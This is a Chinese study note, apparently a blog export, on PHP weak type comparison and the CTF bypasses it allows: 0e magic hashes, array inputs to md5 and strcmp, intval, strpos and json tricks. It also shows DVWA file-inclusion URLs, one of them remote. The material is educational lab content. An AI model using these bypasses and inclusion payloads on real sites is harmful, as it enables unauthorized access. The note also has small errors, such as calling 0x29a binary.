{"title":"php弱类型比较以及绕过","uid":"ce536701181d097db34a6f82f02496a3","slug":"php弱类型比较及绕过","date":"2022-11-20T04:13:34.240Z","updated":"2022-11-20T05:14:15.887Z","comments":true,"path":"api/articles/php弱类型比较及绕过.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora0432a40b6ab749f8ae473d5c7e9ce12a.jpg","content":"<h2 id=\"PHP中的弱类型比较\"><a href=\"#PHP中的弱类型比较\" class=\"headerlink\" title=\"PHP中的弱类型比较\"></a>PHP中的弱类型比较</h2><p><strong>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换</strong></p>\n<h3 id=\"0-强类型与弱类型\"><a href=\"#0-强类型与弱类型\" class=\"headerlink\" title=\"0.强类型与弱类型\"></a>0.强类型与弱类型</h3><p><strong>强类型</strong></p>\n<p>•所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型。J</p>\n<p>•ava、.NET、C++等都是强类型语言，在变量使用之前必须声明变量的类型和名称；且不经强制转换不允许两种不同类型的变量互相操作。</p>\n<p><strong>弱类型</strong></p>\n<p>•对数据的类型要求并不严格，可以让数据类型互相转换。</p>\n<h3 id=\"1-x3D-x3D-和-x3D-x3D-x3D-的区别\"><a href=\"#1-x3D-x3D-和-x3D-x3D-x3D-的区别\" class=\"headerlink\" title=\"1.&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;的区别\"></a>1.&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;的区别</h3><p>php中其中两种比较符号:</p>\n<p>&#x3D;&#x3D;：先将字符串类型转化成相同，再比较<br>&#x3D;&#x3D;&#x3D;：先判断两种字符串的类型是否相等，再比较</p>\n<h4 id=\"PHP转换规则\"><a href=\"#PHP转换规则\" class=\"headerlink\" title=\"PHP转换规则\"></a><strong>PHP转换规则</strong></h4><p>字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较，若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0；例如</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">var_dump(12&#x3D;&#x3D;&quot;12&quot;)                                 &#x2F;&#x2F;true\nvar_dump(12&#x3D;&#x3D;&quot;12aa&quot;)                               &#x2F;&#x2F;true\nvar_dump( &quot;admin&quot;&#x3D;&#x3D;0)\t\t\t\t\t\t\t    &#x2F;&#x2F;true\nvar_dump(false&#x3D;&#x3D;&quot;&quot;&#x3D;&#x3D;0&#x3D;&#x3D;NULL)\t\t\t\t\t\t&#x2F;&#x2F;true</code></pre>\n\n<p><strong>例子2：</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">var_dump(&#39;a&#39; &#x3D;&#x3D; 0);\t    &#x2F;&#x2F;bool(true)\nvar_dump(&#39;1a&#39; &#x3D;&#x3D; 1);\t&#x2F;&#x2F;bool(true)\nvar_dump(&#39;12a&#39; &#x3D;&#x3D; 1);\t&#x2F;&#x2F;bool(false)</code></pre>\n\n<p>会出现上面的结果是因为字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成False，False又和0弱类型比较是相等的，所以第一个是true。</p>\n<p>但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。</p>\n<h3 id=\"2-布尔型和任意比较\"><a href=\"#2-布尔型和任意比较\" class=\"headerlink\" title=\"2.布尔型和任意比较\"></a>2.布尔型和任意比较</h3><p>布尔值true和任意字符串都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的，例如:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">var_dump(true&#x3D;&#x3D;&quot;hyuf&quot;)                   &#x2F;&#x2F;true\nvar_dump(True &#x3D;&#x3D; 0);\t                 &#x2F;&#x2F;bool(false)\nvar_dump(True &#x3D;&#x3D; &#39;False&#39;);\t             &#x2F;&#x2F;bool(true)\nvar_dump(True &#x3D;&#x3D; 2);\t                 &#x2F;&#x2F;bool(true)</code></pre>\n\n\n\n<h3 id=\"3-hash值和字符串“0”比较\"><a href=\"#3-hash值和字符串“0”比较\" class=\"headerlink\" title=\"3.hash值和字符串“0”比较\"></a>3.hash值和字符串“0”比较</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$str1 &#x3D; &quot;a&quot;;\necho md5($str1);\t&#x2F;&#x2F;0cc175b9c0f1b6a831c399e269772661\nvar_dump(md5($str1) &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(false)\n---------------------------------------------------------\n$str2 &#x3D; &quot;s224534898e&quot;;\necho md5($str2);\t&#x2F;&#x2F;0e420233178946742799316739797882\nvar_dump(md5($str2) &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(true)\n---------------------------------------------------------\n$str3 &#x3D; &#39;a1b2edaced&#39;;\necho md5($str3);\t&#x2F;&#x2F;0e45ea817f33691a3dd1f46af81166c4bool\nvar_dump(md5($str3) &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(false)\n---------------------------------------------------------\nvar_dump(&#39;0e111111111111&#39; &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(true) </code></pre>\n\n\n\n<ul>\n<li>其实我觉得这个不应该叫做hash值和字符串0的比较，应该叫做科学计数法和字符串和0的比较，<strong>只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0</strong>。</li>\n<li>所以当hash出来的32个值，开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的。</li>\n<li>第一条只是0开头，所以只能当普通字符串，结果为false。</li>\n<li>第二条0e后面全为数字，符合要求，结果为true。</li>\n<li>第三条虽然为0e，但是后面不全为数字，所以结果为false。</li>\n<li>最后一条就是告诉大家，不是只有hash才能和字符串0相等。</li>\n<li>数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；</li>\n<li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。</li>\n</ul>\n<h3 id=\"4-Strcmp函数的漏洞\"><a href=\"#4-Strcmp函数的漏洞\" class=\"headerlink\" title=\"4.Strcmp函数的漏洞\"></a>4.Strcmp函数的漏洞</h3><p>strcmp()用法如下</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221120125019731.png\" alt=\"image-20221120125019731\"></p>\n<p>有一些细节需要注意下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">strcmp(s1，s2)\n说明：\n\n当s1&lt;s2时，返回为负数 注意不一定是-1，测试结果是比较字符串长度\n当s1&#x3D;&#x3D;s2时，返回值&#x3D; 0\n当s1&gt;s2时，返回正数 注意不一定是1，测试结果是比较字符串长度\n如果两个字符串不同等，但是字符串长度相同，就比较从哪一位开始不同的，然后比较那一位的大小。\n\n即：两个字符串自左向右逐个字符相比（按ASCII值大小相比较），直到出现不同的字符或遇&#39;\\0&#39;为止。如：\n&quot;A&quot;&lt;&quot;B&quot; &quot;a&quot;&gt;&quot;A&quot; &quot;computer&quot;&gt;&quot;compare&quot;</code></pre>\n\n\n\n<p>特别注意：<code>strcmp(const char *s1,const char * s2)</code>这里面只能比较字符串，不能比较数字等其他形式的参数，如果出现了其它参数，则会<code>retrun null</code>，有些题目就是利用这一点来进行和<code>0</code>的完成比较。</p>\n<p>不过测试的结果是只有数组的时候才会出现这个问题，数字不会，和网上的资料有点出入。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n$test &#x3D; 8;\nif (strcmp($test,&quot;test&quot;))&#123;\n\techo &quot;ok!&quot;;\n\techo &quot;\\n&quot;;\n\techo strcmp($test,&quot;test&quot;);\n\t&#125;\nelse \n\techo &quot;oh no!&quot;\n?&gt;\n\n\n运行结果\n\nok!\n-1  \n\n</code></pre>\n\n<p>传入的是数字，返回的是<code>-1</code>而不是<code>0</code>，但传入数组就不一样了。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n$test &#x3D; array();\n$test[0]&#x3D;1;\nprint_r($test);\n\nif (strcmp($test,&quot;test&quot;))&#123;\n\techo &quot;ok!&quot;;\n\techo &quot;\\n&quot;;\n\techo strcmp($test,&quot;test&quot;);\n\t&#125;\nelse \n\techo &quot;oh no!&quot;\n?&gt;\n\n运行结果\n\nArray\n(\n    [0] &#x3D;&gt; 1\n)\noh no!\nPHP Warning:  strcmp() expects parameter 1 to be string, array given in &#x2F;box&#x2F;main.php on line 6\n</code></pre>\n\n\n\n<h2 id=\"各种绕过\"><a href=\"#各种绕过\" class=\"headerlink\" title=\"各种绕过\"></a>各种绕过</h2><h3 id=\"1-switch绕过\"><a href=\"#1-switch绕过\" class=\"headerlink\" title=\"1.switch绕过\"></a>1.switch绕过</h3><p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221120125323159.png\" alt=\"image-20221120125323159\"></p>\n<p>具体原理参考站内：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://abyssaler.github.io/post/ctf%E4%B9%8Bwake_php\">https://abyssaler.github.io/post/ctf%E4%B9%8Bwake_php</a></p></blockquote>\n<h3 id=\"2-x3D-x3D-绕过\"><a href=\"#2-x3D-x3D-绕过\" class=\"headerlink\" title=\"2.&#x3D;&#x3D;绕过\"></a>2.&#x3D;&#x3D;绕过</h3><p>PHP比较运算符 &#x3D;&#x3D;在进行比较的时候是弱类型比较，只需要比较两个值相等就行，不会比较类型</p>\n<p>绕过方法如：1&#x3D;1.0,1&#x3D;+1</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$a&#x3D;1;\n\nif($a&#x3D;&#x3D;$_GET[&#39;x&#39;])&#123;\n    echo $flag;\n\n&#125;\n\n&#x2F;&#x2F;使用1.0就可以绕过 </code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">if($_GET[&#39;name&#39;] !&#x3D; $_GET[&#39;password&#39;])&#123;\n    if(MD5($_GET[&#39;name&#39;]) &#x3D;&#x3D; MD5($_GET[&#39;password&#39;]))&#123;\n        echo $flag;\n\n    &#125;\n\n    echo &#39;?&#39;;\n\n&#125;\n\n&#x2F;&#x2F;MD5(&#39;QNKCDZO&#39;)&#x3D;&#x3D;MD5(&#39;240610708&#39;)\n\n&#x2F;&#x2F;echo MD5(&#39;QNKCDZO&#39;);\n\n&#x2F;&#x2F;echo MD5(&#39;240610708&#39;);\n\nPHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</code></pre>\n\n\n\n<h3 id=\"3-x3D-x3D-x3D-绕过\"><a href=\"#3-x3D-x3D-x3D-绕过\" class=\"headerlink\" title=\"3.&#x3D;&#x3D;&#x3D;绕过\"></a>3.&#x3D;&#x3D;&#x3D;绕过</h3><p>PHP比较运算符 &#x3D;&#x3D;&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等。只要两边字符串类型不同会返回false</p>\n<p>绕过方法：使用数组绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">if($_GET[&#39;name&#39;] !&#x3D; $_GET[&#39;password&#39;])&#123;\n    if(MD5($_GET[&#39;name&#39;]) &#x3D;&#x3D; MD5($_GET[&#39;password&#39;]))&#123;\n        echo $flag;\n\n    &#125;\n\n    echo &#39;?&#39;;\n\n&#125;\n\n&#x2F;&#x2F;name[]&#x3D;1&amp;password[]&#x3D;2\n\nPHP中md5()函数无法处理数组（会返回NULL）\n\n&#x3D;&#x3D;的也可以用数组绕过</code></pre>\n\n\n\n<h3 id=\"4-intval-函数\"><a href=\"#4-intval-函数\" class=\"headerlink\" title=\"4.intval()函数\"></a>4.intval()函数</h3><p>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1（注意这个通常配合preg_match来使用）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">语法\nint intval ( mixed $var [, int $base &#x3D; 10 ] )\n参数说明：\n\n$var：要转换成 integer 的数量值。\n$base：转化所使用的进制。\n\n如果 base为空，通过检测 var 的格式来决定使用的进制：\n\n如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；\n否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；\n否则，将使用 10 进制 (decimal)。</code></pre>\n\n<p>绕过方法：通过使用0x或者0开始的格式来绕过不相等的判断（像一些要先判断不相等再判断相等的题目）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$i&#x3D;&#39;666&#39;;\n\n$ii&#x3D;$_GET[&#39;n&#39;];\n\nif(intval($ii&#x3D;&#x3D;$i,0 ))&#123;\n    echo $flag;\n\n&#125;\n\n&#x2F;&#x2F;n&#x3D;0x29a   666的二进制是29a\n\n通过检测 $ii的格式来决定使用的进制</code></pre>\n\n\n\n<h3 id=\"5-strpos-函数\"><a href=\"#5-strpos-函数\" class=\"headerlink\" title=\"5.strpos()函数\"></a>5.strpos()函数</h3><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。(函数返回查找到这个find字符串的位置，那么如果是0位置，就值得注意了)</p>\n<p><strong>注释：strpos() 函数是区分大小写的。</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">strpos(string,find,start)\n\n参数\t\t描述\nstring\t必需。规定被搜索的字符串。\nfind\t必需。规定要查找的字符。\nstart\t可选。规定开始搜索的位置\n</code></pre>\n\n<p>绕过方法：利用换行进行绕过（%0a） </p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$i&#x3D;&#39;666&#39;;\n\n$ii&#x3D;$_GET[&#39;h&#39;];\n\nif(strpos($ii,$i,&quot;0&quot;))&#123;\n    echo $flag;\n\n&#125;\n\n&#x2F;&#x2F;?num&#x3D;%0a666</code></pre>\n\n\n\n<h3 id=\"6-in-array-函数\"><a href=\"#6-in-array-函数\" class=\"headerlink\" title=\"6.in_array()函数\"></a>6.in_array()函数</h3><p>in_array() 函数搜索数组中是否存在指定的值。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">bool in_array ( mixed $needle , array $haystack [, bool $strict &#x3D; FALSE ] )\n参数\t\t\t描述\nneedle\t\t必需。规定要在数组搜索的值。\nhaystack\t必需。规定要搜索的数组。\nstrict\t\t可选。如果该参数设置为 TRUE，则 in_array() 函数检查搜索的数据与数组的值的类型是否相同。</code></pre>\n\n<p>问题就出在第三个参数，如果第三个参数不设置为true就不检测类型，是弱比较，相当于&#x3D;&#x3D;号</p>\n<p>绕过方法：与&#x3D;&#x3D;一样 </p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$whitelist &#x3D; [1,2,3];\n\n$page&#x3D;$_GET[&#39;i&#39;];\n\nif (in_array($page, $whitelist)) &#123;\n    echo &quot;yes&quot;;\n\n&#125;\n\n&#x2F;&#x2F;?i&#x3D;1ex</code></pre>\n\n\n\n<h3 id=\"7-preg-match-函数\"><a href=\"#7-preg-match-函数\" class=\"headerlink\" title=\"7.preg_match()函数\"></a>7.preg_match()函数</h3><p>preg_match 函数用于执行一个正则表达式匹配。</p>\n<p>详细用法可以参考：<a href=\"https://www.runoob.com/php/php-preg_match.html\">https://www.runoob.com/php/php-preg_match.html</a></p>\n<p>绕过方法：preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错,如果正则不匹配多行(&#x2F;m)也可用上面的换行方法绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">if(isset($_GET[&#39;num&#39;]))&#123;\n    $num &#x3D; $_GET[&#39;num&#39;];\n\n    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;[t1] \n\n        die(&quot;no no no!&quot;);\n\n    &#125;\n\n    if(intval($num))&#123;\n        echo $flag;\n\n    &#125;\n\n&#125;\n\n&#x2F;&#x2F;?num[]&#x3D;1\n\n上面介绍过了，intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</code></pre>\n\n\n\n<h3 id=\"8-str-replace函数\"><a href=\"#8-str-replace函数\" class=\"headerlink\" title=\"8.str_replace函数\"></a>8.str_replace函数</h3><p>str_replace() 函数用于替换字符串中指定字符（区分大小写）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\necho str_replace(&quot;world&quot;,&quot;Peter&quot;,&quot;Hello world!&quot;);\n?&gt;\n\n&#x2F;&#x2F;输出：Hello Peter!</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">str_replace(find,replace,string,count)\n\n参数\t\t描述\nfind\t必需。规定要查找的值。\nreplace\t必需。规定替换 find 中的值的值。\nstring\t必需。规定被搜索的字符串。\ncount\t可选。一个变量，对替换数进行计数。\n</code></pre>\n\n<p>绕过方法：str_replace无法迭代过滤 ，可以通过双写绕过</p>\n<p>例如：例如page&#x3D;ht<a href=\"http://tp//192.168.0.103/phpinfo.txt%E6%97%B6%EF%BC%8Cstr_replace%E5%87%BD%E6%95%B0%E4%BC%9A%E5%B0%86http://%E5%88%A0%E9%99%A4%EF%BC%8C%E4%BA%8E%E6%98%AFpage=http://192.168.0.103/phpinfo.txt%EF%BC%8C%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E3%80%82\">http://tp://192.168.0.103/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.0.103/phpinfo.txt，成功执行远程命令。</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">三个实例：\n\n1、本地文件包含\nhttp:&#x2F;&#x2F;192.168.0.103&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;page&#x3D;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;xampp&#x2F;htdocs&#x2F;dvwa&#x2F;php.ini\n2、绝对路径不受任何影响\nhttp:&#x2F;&#x2F;192.168.0.103&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;page&#x3D;C:&#x2F;xampp&#x2F;htdocs&#x2F;dvwa&#x2F;php.ini\n3、远程文件包含\nhttp:&#x2F;&#x2F;192.168.0.103&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;192.168.5.12&#x2F;phpinfo.txt</code></pre>\n\n\n\n<h3 id=\"9-json绕过\"><a href=\"#9-json绕过\" class=\"headerlink\" title=\"9.json绕过\"></a>9.json绕过</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nif (isset($_POST[&#39;message&#39;])) &#123;\n    $message &#x3D; json_decode($_POST[&#39;message&#39;]);\n    $key &#x3D;&quot;*********&quot;;\n    if ($message-&gt;key &#x3D;&#x3D;$key ) &#123;\n        echo &quot;flag&quot;;\n    &#125; \n    else &#123;\n        echo &quot;fail&quot;;\n    &#125;\n &#125;\n else&#123;\n     echo &quot;~~~~&quot;;\n &#125;\n?&gt;</code></pre>\n\n<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于<br>$key的值，但是$key的值我们不知道</p>\n<p>这时我们构造一个和任意字符串返回为真的数组{“key”:true}。即可绕过</p>\n<p>payload&#x3D;message&#x3D;{“key”,true}</p>\n<h3 id=\"10-array-search的漏洞\"><a href=\"#10-array-search的漏洞\" class=\"headerlink\" title=\"10.array_search的漏洞\"></a>10.array_search的漏洞</h3><p>array_search() 函数与 <a href=\"https://link.zhihu.com/?target=http://www.w3school.com.cn/php/func_array_in_array.asp\">in_array</a><a href=\"https://link.zhihu.com/?target=http://www.w3school.com.cn/php/func_array_in_array.asp\">()</a> 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回<br>false。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n$a&#x3D;array(1,4);\nvar_dump(array_search(&quot;4admin&quot;,$a)); &#x2F;&#x2F; int(0)&#x3D;&gt; 返回键值1\nvar_dump(array_search(&quot;1admin&quot;,$a)); &#x2F;&#x2F; int(1) &#x3D;&#x3D;&gt;返回键值0\n?&gt;&#x2F;&#x2F;这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换。</code></pre>\n\n<p>这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换</p>\n<p>部分内容引用自：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://zhuanlan.zhihu.com/p/30323499\">https://zhuanlan.zhihu.com/p/30323499</a></p>\n<p><a href=\"https://blog.csdn.net/u014029795/article/details/99709333\">https://blog.csdn.net/u014029795/article/details/99709333</a></p>\n<p><a href=\"https://www.csdn.net/tags/MtTaMg2sNTc4NDM0LWJsb2cO0O0O.html\">https://www.csdn.net/tags/MtTaMg2sNTc4NDM0LWJsb2cO0O0O.html</a></p></blockquote>\n","text":"PHP中的弱类型比较php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换 0.强类型与弱类型强类型 •所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是...","link":"","photos":[],"count_time":{"symbolsCount":"9.4k","symbolsTime":"9 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":12,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"php","slug":"php","count":8,"path":"api/tags/php.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83\"><span class=\"toc-text\">PHP中的弱类型比较</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0-%E5%BC%BA%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%B1%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">0.强类型与弱类型</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-x3D-x3D-%E5%92%8C-x3D-x3D-x3D-%E7%9A%84%E5%8C%BA%E5%88%AB\"><span class=\"toc-text\">1.&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;的区别</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#PHP%E8%BD%AC%E6%8D%A2%E8%A7%84%E5%88%99\"><span class=\"toc-text\">PHP转换规则</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E5%B8%83%E5%B0%94%E5%9E%8B%E5%92%8C%E4%BB%BB%E6%84%8F%E6%AF%94%E8%BE%83\"><span class=\"toc-text\">2.布尔型和任意比较</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-hash%E5%80%BC%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E2%80%9C0%E2%80%9D%E6%AF%94%E8%BE%83\"><span class=\"toc-text\">3.hash值和字符串“0”比较</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-Strcmp%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">4.Strcmp函数的漏洞</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">各种绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-switch%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">1.switch绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-x3D-x3D-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">2.&#x3D;&#x3D;绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-x3D-x3D-x3D-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">3.&#x3D;&#x3D;&#x3D;绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" 